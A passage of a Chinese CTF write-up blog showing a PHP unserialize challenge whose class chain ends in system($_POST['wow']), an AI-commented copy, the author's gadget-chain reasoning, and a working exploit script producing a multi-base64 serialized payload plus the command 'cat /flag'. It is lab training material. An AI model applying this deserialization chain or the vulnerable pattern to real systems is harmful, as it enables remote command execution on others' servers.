class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">best64_decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$str</span>)))));<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yesterday</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$learn</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>=<span class="hljs-string">&quot;study&quot;</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$try</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;learn = <span class="hljs-string">&quot;learn&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;study-&gt;<span class="hljs-title function_ invoke__">hard</span>();<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">today</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$doing</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$did</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$done</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;did = <span class="hljs-string">&quot;What you did makes you outstanding.&lt;br&gt;&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;done = <span class="hljs-string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;done;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;doing))==<span class="hljs-number">666</span>)&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doing</span>();<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;doing-&gt;better;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$good</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$bad</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$soso</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;good=<span class="hljs-string">&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;good;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;bad=<span class="hljs-string">&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$impossible</span>=<span class="hljs-string">&quot;How can you get here?&lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$out</span>;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$no</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$useful1</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful2</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful3</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful4</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful5</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful6</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful7</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful8</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful9</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful10</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful11</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful12</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful13</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful14</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful15</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful16</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful17</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful18</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful19</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful20</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;out-&gt;useful7) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Seven is my lucky number&lt;br&gt;&quot;</span>;<br>                <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your future.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;wow&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;win&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;no = <span class="hljs-string">&quot;no&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;no;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-number">0</span>,-<span class="hljs-number">4</span>);<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">best64_decode</span>(<span class="hljs-variable">$data</span>));<br>    &#125;<br>    <span class="hljs-comment">// You learn yesterday, you choose today, can you get to your future?</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ai注释一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-comment">// 显示当前文件的源代码</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-comment">// 关闭所有错误报告</span><br>    <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">// 定义一个多层base64解码的函数</span><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">best64_decode</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// 对输入字符串进行5次base64解码</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$str</span>))));<br>    &#125;<br><br>    // 定义yesterday类<br>    <span class="hljs-keyword">class</span> yesterday &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$learn</span>;      // 公共属性learn<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>=<span class="hljs-string">&quot;study&quot;</span>;  // 公共属性study，默认值为<span class="hljs-string">&quot;study&quot;</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$try</span>;        // 公共属性<span class="hljs-keyword">try</span><br><br>        // 构造函数<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__construct</span>()<br>        &#123;<br>            // 初始化learn属性<br>            <span class="hljs-variable">$this</span>-&gt;learn = <span class="hljs-string">&quot;learn&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>        // 析构函数<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__destruct</span>()<br>        &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;<br>            // 调用study对象的hard方法<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$this</span>-&gt;study-&gt;<span class="hljs-title function_ invoke__">hard</span>();<br>        &#125;<br>    &#125;<br><br>    // 定义today类<br>    <span class="hljs-keyword">class</span> today &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$doing</span>;  // 公共属性doing<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$did</span>;    // 公共属性did<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$done</span>;   // 公共属性done<br><br>        // 构造函数<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__construct</span>()&#123;<br>            // 初始化did属性<br>            <span class="hljs-variable">$this</span>-&gt;did = <span class="hljs-string">&quot;What you did makes you outstanding.&lt;br&gt;&quot;</span>;<br>        &#125;<br><br>        // 魔术方法：当调用不存在的方法时触发<br>        <span class="hljs-keyword">public</span> function <span class="hljs-title function_ invoke__">__call</span>(<span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span>)<br>        &#123;<br>            <span class="hljs-variable">$this</span>-&gt;done = <span class="hljs-string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$this</span>-&gt;done;<br>            // 检查doing属性的双重MD5哈希是否等于<span class="hljs-number">666</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;doing))==<span class="hljs-number">666</span>)&#123;<br>                <span class="hljs-comment">// 调用doing属性作为函数</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">doing</span>();<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-comment">// 返回doing对象的better属性</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;doing-&gt;better;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 定义tommoraw类</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span> </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$good</span>;   <span class="hljs-comment">// 公共属性good</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$bad</span>;    <span class="hljs-comment">// 公共属性bad</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$soso</span>;   <span class="hljs-comment">// 公共属性soso</span><br><br>        <span class="hljs-comment">// 魔术方法：当对象被当作函数调用时触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;good=<span class="hljs-string">&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;good;<br>        &#125;<br><br>        <span class="hljs-comment">// 魔术方法：当访问不存在的属性时触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;bad=<span class="hljs-string">&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 定义future类</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$impossible</span>=<span class="hljs-string">&quot;How can you get here?&lt;br&gt;&quot;</span>;  <span class="hljs-comment">// 私有属性impossible</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$out</span>;     <span class="hljs-comment">// 私有属性out</span><br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$no</span>;      <span class="hljs-comment">// 私有属性no</span><br>        <span class="hljs-comment">// 多个公共属性</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$useful1</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful2</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful3</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful4</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful5</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful6</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful7</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful8</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful9</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful10</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful11</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful12</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful13</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful14</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful15</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful16</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful17</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful18</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful19</span>;<span class="hljs-keyword">public</span> <span class="hljs-variable">$useful20</span>;<br><br>        <span class="hljs-comment">// 魔术方法：当给不存在的属性赋值时触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$arg1</span>, <span class="hljs-variable">$arg2</span></span>) </span>&#123;<br>            <span class="hljs-comment">// 检查out对象的useful7属性是否存在</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;out-&gt;useful7) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Seven is my lucky number&lt;br&gt;&quot;</span>;<br>                <span class="hljs-comment">// 执行系统命令whoami</span><br>                <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// 魔术方法：当对象被当作字符串使用时触发</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;This is your future.&lt;br&gt;&quot;</span>;<br>            <span class="hljs-comment">// 执行POST参数wow指定的系统命令</span><br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;wow&quot;</span>]);<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;win&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 析构函数</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;no = <span class="hljs-string">&quot;no&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;no;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 检查filename参数指定的文件是否存在</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>]))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Focus on the previous step!&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">// 如果文件不存在，去掉filename参数最后4个字符</span><br>        <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>],<span class="hljs-number">0</span>,-<span class="hljs-number">4</span>);<br>        <span class="hljs-comment">// 对处理后的数据进行5次base64解码后反序列化</span><br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">best64_decode</span>(<span class="hljs-variable">$data</span>));<br>    &#125;<br><br>    <span class="hljs-comment">// 注释提示：你昨天学习，今天选择，能到达你的未来吗？</span><br>    <span class="hljs-comment">// You learn yesterday, you choose today, can you get to your future?</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>给d导解析了一下，没直接给出能用的payload，但是思路看了一下应该没问题，先调用yesterday 里的__destruct，里面调用了一个hard方法，对应today的_call，然后是当md5调用类时会将其当成字符串调用，对应future里的_toString，然后_toString里直传参wow即可  </p><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">yesterday</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$learn</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$study</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$try</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">today</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$doing</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$done</span>=<span class="hljs-string">&#x27;test&#x27;</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">tommoraw</span></span>&#123;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">future</span></span>&#123;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> yesterday;<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> today;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> tommoraw;<br><span class="hljs-variable">$d</span> = <span class="hljs-keyword">new</span> future;<br><br><span class="hljs-comment">// 正确的属性赋值方式</span><br><span class="hljs-variable">$a</span>-&gt;study = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;doing=<span class="hljs-variable">$d</span>;<br><br><span class="hljs-comment">// 先序列化，再多层base64编码</span><br><span class="hljs-variable">$serialized</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$p</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$serialized</span>)))));<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$p</span>.<span class="hljs-string">&#x27;aaaa&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后再post里传wow来运行即可<br>wow&#x3D;cat &#x2F;flag;</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TPLTCTF-web</title>
    <link href="/2025/06/15/TPLTCTF-web/"/>
    <url>/2025/06/15/TPLTCTF-web/</url>
    
    <content type="html"><![CDATA[<h1 id="TLPTCTF"><a href="#TLPTCTF" class="headerlink" title="TLPTCTF"></a>TLPTCTF</h1><h1 id="魔法图书馆"><a href="#魔法图书馆" class="headerlink" title="魔法图书馆"></a>魔法图书馆</h1><p>纯纯拷打ai，没有半点思考  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span 